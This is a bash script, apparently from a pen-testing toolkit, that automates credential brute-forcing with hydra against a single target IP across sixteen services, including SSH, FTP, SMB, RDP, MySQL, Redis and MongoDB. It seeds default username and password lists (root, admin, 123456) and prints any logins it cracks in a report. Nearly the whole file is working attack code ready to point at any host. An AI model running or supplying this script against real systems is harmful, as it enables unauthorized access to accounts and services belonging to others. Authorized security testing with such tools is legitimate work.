#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: FULL INFRASTRUCTURE SCAN & ATTACK
# Comprehensive test of ALL protocols (Ultimate Pen-Test)
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.100"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_full_infra_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"
REPORT_FILE="$OUTPUT_DIR/combo_full_infra_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S)_REPORT.txt"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: FULL INFRASTRUCTURE" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: ALL 16 CORE PROTOCOLS" | tee -a "$LOG_FILE"
echo "  Scenario: Complete Enterprise Pen-Test" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "root\nadmin\nuser\nadministrator" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "password\nadmin\n123456\nroot" > "$PASSLIST"

declare -A protocols=(
    ["SSH"]="22:ssh"
    ["FTP"]="21:ftp"
    ["Telnet"]="23:telnet"
    ["SMTP"]="25:smtp"
    ["POP3"]="110:pop3"
    ["IMAP"]="143:imap"
    ["SNMP"]="161:snmp"
    ["LDAP"]="389:ldap"
    ["SMB"]="445:smb"
    ["MySQL"]="3306:mysql"
    ["RDP"]="3389:rdp"
    ["PostgreSQL"]="5432:postgres"
    ["VNC"]="5900:vnc"
    ["Redis"]="6379:redis"
    ["MongoDB"]="27017:mongodb"
    ["MSSQL"]="1433:mssql"
)

success_count=0
fail_count=0
total_count=${#protocols[@]}

for proto_name in "${!protocols[@]}"; do
    IFS=':' read -r port proto_cmd <<< "${protocols[$proto_name]}"
    
    echo "━━━ Testing $proto_name (Port $port) ━━━" | tee -a "$LOG_FILE"
    
    if command -v hydra &>/dev/null; then
        if [[ "$proto_cmd" == "snmp" ]] || [[ "$proto_cmd" == "vnc" ]] || [[ "$proto_cmd" == "redis" ]]; then
            # Password-only protocols
            if hydra -P "$PASSLIST" -t 4 -w 10 "$proto_cmd://$TARGET" 2>&1 | tee -a "$LOG_FILE" | grep -q "login:"; then
                ((success_count++))
                echo "[+] $proto_name: VULNERABLE" | tee -a "$REPORT_FILE"
            else
                ((fail_count++))
                echo "[-] $proto_name: Secure" | tee -a "$REPORT_FILE"
            fi
        else
            # User/pass protocols
            if hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -w 10 "$proto_cmd://$TARGET" 2>&1 | tee -a "$LOG_FILE" | grep -q "login:"; then
                ((success_count++))
                echo "[+] $proto_name: VULNERABLE" | tee -a "$REPORT_FILE"
            else
                ((fail_count++))
                echo "[-] $proto_name: Secure" | tee -a "$REPORT_FILE"
            fi
        fi
    else
        echo "[!] Hydra not installed" | tee -a "$LOG_FILE"
        break
    fi
    
    echo "" | tee -a "$LOG_FILE"
done

# Generate Final Report
echo "" | tee -a "$REPORT_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "  FULL INFRASTRUCTURE SCAN REPORT" | tee -a "$REPORT_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "Target: $TARGET" | tee -a "$REPORT_FILE"
echo "Date: $(date)" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"
echo "Statistics:" | tee -a "$REPORT_FILE"
echo "  Total Protocols Tested: $total_count" | tee -a "$REPORT_FILE"
echo "  Vulnerable Services: $success_count" | tee -a "$REPORT_FILE"
echo "  Secure Services: $fail_count" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

if [ $success_count -gt 0 ]; then
    echo "⚠️  SECURITY ISSUES FOUND - IMMEDIATE ACTION REQUIRED" | tee -a "$REPORT_FILE"
    echo "" | tee -a "$REPORT_FILE"
    echo "Credentials Found:" | tee -a "$REPORT_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$REPORT_FILE"
else
    echo "✅ All tested services appear secure" | tee -a "$REPORT_FILE"
fi

echo "" | tee -a "$REPORT_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"
echo "Full logs: $LOG_FILE" | tee -a "$REPORT_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$REPORT_FILE"

# Display report
cat "$REPORT_FILE"

exit 0
